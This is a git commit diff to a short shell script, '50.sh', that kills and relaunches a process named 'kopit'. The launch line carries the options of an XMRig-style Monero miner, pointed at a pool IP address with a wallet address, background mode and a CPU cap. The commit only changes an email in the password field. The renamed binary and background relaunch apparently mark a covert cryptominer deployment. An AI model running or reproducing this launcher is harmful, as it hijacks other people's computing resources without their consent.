1b508d4ec2f61c66226f69ce6c2d2608e150f6f5
mike <50838860+MIksterww3@users.noreply.github.com>
2019-05-24 04:56:54 -0700

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,3 +1,3 @@
 pkill kopit
 sleep 7
-kopit -o 95.81.1.65:3333 -u 44PqYkRfNRzhKNkcJUiwtCSauWFfLq53MG9VMQ8Ftb727sSBMXADCnBfAS6GNYJSop3HiKt2ifbxnMzAsuR2Cvyu6bgCHdn --pass=x:ZamareLangland93@mail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=75 --av=1 --variant -1
+kopit -o 95.81.1.65:3333 -u 44PqYkRfNRzhKNkcJUiwtCSauWFfLq53MG9VMQ8Ftb727sSBMXADCnBfAS6GNYJSop3HiKt2ifbxnMzAsuR2Cvyu6bgCHdn --pass=x:VallierJessup94@mail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=75 --av=1 --variant -1
